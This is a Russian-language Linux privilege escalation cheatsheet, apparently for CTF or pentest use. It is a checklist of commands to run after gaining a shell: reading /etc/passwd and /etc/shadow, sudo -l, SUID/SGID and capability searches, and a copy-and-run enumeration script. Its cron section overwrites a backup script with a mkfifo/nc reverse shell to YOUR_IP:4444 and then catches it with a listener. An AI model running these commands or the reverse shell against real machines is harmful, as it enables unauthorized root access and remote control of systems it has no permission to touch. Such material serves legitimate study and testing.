# Linux Privilege Escalation Cheatsheet

**Pipeline для быстрого enumeration** — запускаем сразу после получения shell.
## 📋 1. Базовое Enumeration (инфо о системе)
```bash
# Общая информация
hostname                              # Имя хоста
whoami; id                            # Текущий пользователь и группы
sudo -l                               # Разрешения sudo (может быть без пароля!)
uname -a; cat /proc/version           # Ядро и версия системы
cat /etc/issue; cat /etc/os-release   # Дистрибутив
ps aux | grep root                    # Процессы root
```
## 📋 2. Файлы конфигурации и пароли
```bash
# Пользователи и пароли
cat /etc/passwd             # Список пользователей
cat /etc/shadow             # Хэши паролей (если доступ)
cat /etc/group              # Группы

# Cron jobs (часто root-задачи)
cat /etc/crontab
cat /etc/cron*/*
ls -la /etc/cron.d/

# Другие конфиги
cat /etc/exports            # NFS shares
echo $PATH                  # Переменные окружения (PATH hijacking)
```
## 📋 3. SUID/SGID бинарники (setuid-эскалация)
```bash
# Поиск SUID/SGID файлов (запускаются от root)
find / -perm -4000 -type f 2>/dev/null 2>&1    # SUID
find / -perm -u=s -type f 2>/dev/null 2>&1     # Альтернатива SUID  
find / -perm -2000 -type f 2>/dev/null 2>&1    # SGID

# Capabilities (расширенные привилегии)
getcap -r / 2>/dev/null | grep cap
```
> Что делать дальше: Для каждого SUID-бинарника гугли GTFOBins
(find, vim, python часто позволяют shell)
## 📋 4. Cron Jobs Exploitation
```bash
# Заменяем содержимое на reverse shell
echo '#!/bin/bash' > /etc/mp3backups/backup.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f' >> /etc/mp3backups/backup.sh
chmod +x /etc/mp3backups/backup.sh

# Ждём выполнения cron → ловим shell
nc -lvnp 4444
```
## 📋 5. Поиск флагов (CTF-стиль)
```bash
find / -name "*flag*" 2>/dev/null
find / -name "flag*.txt" 2>/dev/null
grep -r --include="*.txt" "flag|root|password" /home 2>/dev/null
```
## 📋 6. Полный pipeline (скопируй и запусти целиком)
```bash
#!/bin/bash
echo "[+] Basic info"; whoami; id; hostname; sudo -l
echo "[+] System"; uname -a; cat /etc/os-release  
echo "[+] Processes"; ps aux | grep root
echo "[+] SUID/SGID"; find / -perm -4000 2>/dev/null | xargs -I {} ls -la {}
echo "[+] Cron"; cat /etc/crontab; ls /etc/cron*
echo "[+] Capabilities"; getcap -r / 2>/dev/null

```
